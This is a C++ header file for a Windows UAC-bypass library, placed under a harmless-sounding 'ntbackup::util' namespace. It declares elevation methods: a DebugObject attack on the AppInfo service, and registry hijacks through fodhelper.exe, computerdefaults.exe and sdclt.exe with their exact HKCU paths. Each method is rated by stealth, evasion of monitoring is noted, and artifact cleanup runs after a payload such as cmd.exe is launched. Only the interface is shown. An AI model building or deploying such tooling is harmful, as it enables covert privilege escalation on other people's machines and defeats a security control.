#pragma once

#include <Windows.h>

namespace ntbackup::util {

//
// Status codes for elevation operations
//
typedef LONG ELEVATION_STATUS;

#define ELEVATION_SUCCESS                       ((ELEVATION_STATUS)0x00000000L)
#define ELEVATION_STATUS_ALREADY_ELEVATED       ((ELEVATION_STATUS)0x00000001L)

#define ELEVATION_ERR_GENERIC                   ((ELEVATION_STATUS)0x80000001L)
#define ELEVATION_ERR_OS_NOT_SUPPORTED          ((ELEVATION_STATUS)0x80000002L)
#define ELEVATION_ERR_NOT_ADMIN_GROUP           ((ELEVATION_STATUS)0x80000003L)
#define ELEVATION_ERR_METHOD_PATCHED            ((ELEVATION_STATUS)0x80000004L)
#define ELEVATION_ERR_METHOD_NOT_IMPLEMENTED    ((ELEVATION_STATUS)0x80000005L)
#define ELEVATION_ERR_PAYLOAD_NOT_FOUND         ((ELEVATION_STATUS)0x80000006L)
#define ELEVATION_ERR_PAYLOAD_EXECUTION         ((ELEVATION_STATUS)0x80000007L)
#define ELEVATION_ERR_COM_INIT                  ((ELEVATION_STATUS)0x80000008L)
#define ELEVATION_ERR_COM_INTERFACE             ((ELEVATION_STATUS)0x80000009L)
#define ELEVATION_ERR_FILE_OPERATION            ((ELEVATION_STATUS)0x8000000AL)
#define ELEVATION_ERR_REGISTRY_ACCESS           ((ELEVATION_STATUS)0x8000000BL)
#define ELEVATION_ERR_TARGET_BINARY_NOT_FOUND   ((ELEVATION_STATUS)0x8000000CL)
#define ELEVATION_ERR_DLL_WRITE                 ((ELEVATION_STATUS)0x8000000DL)
#define ELEVATION_ERR_DLL_HIJACK                ((ELEVATION_STATUS)0x8000000EL)
#define ELEVATION_ERR_TOKEN_MANIPULATION        ((ELEVATION_STATUS)0x8000000FL)
#define ELEVATION_ERR_TIMEOUT                   ((ELEVATION_STATUS)0x80000010L)
#define ELEVATION_ERR_INVALID_PARAMETER         ((ELEVATION_STATUS)0x80000011L)
#define ELEVATION_ERR_INSUFFICIENT_BUFFER       ((ELEVATION_STATUS)0x80000012L)
#define ELEVATION_ERR_ACCESS_DENIED             ((ELEVATION_STATUS)0x80000013L)
#define ELEVATION_ERR_CLEANUP_FAILED            ((ELEVATION_STATUS)0x80000014L)

#define ELEVATION_SUCCEEDED(Status)     ((ELEVATION_STATUS)(Status) >= 0)
#define ELEVATION_FAILED(Status)        ((ELEVATION_STATUS)(Status) < 0)

//
// Elevation methods
//
// Stealth ratings:
//   [STEALTH: HIGH]   - No file drops, minimal/no registry, low forensic footprint
//   [STEALTH: MEDIUM] - Temporary file drops or registry keys, cleaned after execution
//   [STEALTH: LOW]    - Persistent artifacts, file system writes to system directories
//
typedef enum _UAC_METHOD : DWORD {
    //
    // Auto-select best available method for current OS version
    //
    UacMethodAuto = 0,

    //
    // [STEALTH: HIGH] [REQUIRES: Admin Group]
    // AppInfo ALPC + RAiLaunchAdminProcess with DebugObject
    // Attacks the elevation mechanism directly through debug objects
    // No file drops, no registry modifications, no DLL hijacking
    // Works: Windows 7 - Windows 11 (unfixed)
    //
    UacMethodDebugObject,

    //
    // [STEALTH: MEDIUM] [REQUIRES: None]
    // Registry hijack via fodhelper.exe ms-settings protocol handler
    // Writes to HKCU\Software\Classes\ms-settings\Shell\open\command
    // fodhelper.exe auto-elevates and checks ms-settings handler
    // Registry cleaned after execution
    // Works: Windows 10 (10240) - Windows 11 (unfixed)
    //
    UacMethodFodHelper,

    //
    // [STEALTH: MEDIUM] [REQUIRES: None]
    // Registry hijack via computerdefaults.exe ms-settings protocol handler
    // Same technique as fodhelper, different trigger binary
    // Useful for evasion when fodhelper is monitored
    // Registry cleaned after execution
    // Works: Windows 10 RS4 (17134) - Windows 11 (unfixed)
    //
    UacMethodComputerDefaults,

    //
    // [STEALTH: MEDIUM] [REQUIRES: None]  
    // Registry hijack via sdclt.exe isolated command
    // Uses different registry path: HKCU\Software\Classes\exefile\shell\runas\command
    // sdclt.exe auto-elevates and reads IsolatedCommand value
    // Registry cleaned after execution
    // Works: Windows 10 (10240) - Windows 10 RS3 (unfixed on many builds)
    //
    UacMethodSdcltIsolatedCommand,

    UacMethodMax
} UAC_METHOD;

//
// Failure stage - indicates where in the elevation process failure occurred
//
typedef enum _ELEVATION_STAGE : DWORD {
    StageNone = 0,
    StagePreflightCheck,            // OS version, admin group membership, existing elevation
    StagePayloadValidation,         // Payload file existence and accessibility
    StageComInitialization,         // CoInitializeEx
    StageInterfaceAcquisition,      // CoCreateInstance / QueryInterface
    StageFileSystemSetup,           // Directory creation, DLL copy via IFileOperation
    StageRegistrySetup,             // Registry key manipulation
    StageEnvironmentSetup,          // Environment variable manipulation
    StageTriggerExecution,          // Launching auto-elevate target binary
    StagePayloadExecution,          // Elevated payload process creation
    StageCleanup                    // Artifact removal
} ELEVATION_STAGE;

//
// Behavioral flags
//
#define UAC_FLAG_NONE                   0x00000000
#define UAC_FLAG_NO_CLEANUP             0x00000001  // Skip artifact cleanup (debugging)
#define UAC_FLAG_WAIT_FOR_PAYLOAD       0x00000002  // Block until payload process exits
#define UAC_FLAG_PREFER_STEALTH         0x00000004  // Auto method prefers high stealth
#define UAC_FLAG_VERBOSE                0x00000010  // Enable debug output

//
// Elevation parameters
//
typedef struct _UAC_PARAMS {
    DWORD       cbSize;                 // Set to sizeof(UAC_PARAMS)
    UAC_METHOD  Method;                 // Elevation method or UacMethodAuto
    LPCWSTR     lpPayloadPath;          // Full path to payload executable (NULL = cmd.exe)
    LPCWSTR     lpPayloadArgs;          // Command line arguments for payload (optional)
    DWORD       dwFlags;                // UAC_FLAG_* combination
    DWORD       dwTimeoutMs;            // Timeout for elevation attempt (0 = default 30s)
} UAC_PARAMS, *PUAC_PARAMS;

//
// Elevation result
//
typedef struct _UAC_RESULT {
    ELEVATION_STATUS    Status;         // Elevation status code
    DWORD               dwWin32Error;   // GetLastError() at point of failure
    ELEVATION_STAGE     FailureStage;   // Stage where failure occurred
    UAC_METHOD          MethodUsed;     // Actual method used (relevant for Auto)
    HANDLE              hProcess;       // Handle to elevated process (if FLAG_WAIT not set)
    DWORD               dwProcessId;    // PID of elevated process
} UAC_RESULT, *PUAC_RESULT;

//
// Primary API
//

ELEVATION_STATUS
UacElevate(
    _In_ PUAC_PARAMS pParams,
    _Out_ PUAC_RESULT pResult
);

ELEVATION_STATUS
UacElevateSimple(
    _In_ UAC_METHOD Method,
    _In_opt_ LPCWSTR lpCommandLine
);

BOOL
UacIsMethodSupported(
    _In_ UAC_METHOD Method
);

BOOL
UacMethodRequiresAdminGroup(
    _In_ UAC_METHOD Method
);

DWORD
UacGetStatusMessage(
    _In_ ELEVATION_STATUS Status,
    _Out_writes_opt_(cchBuffer) LPWSTR lpBuffer,
    _In_ DWORD cchBuffer
);

LPCWSTR
UacGetMethodName(
    _In_ UAC_METHOD Method
);

BOOL
UacIsElevated(
    VOID
);

BOOL
UacIsAdminGroupMember(
    VOID
);

} // namespace ntbackup::util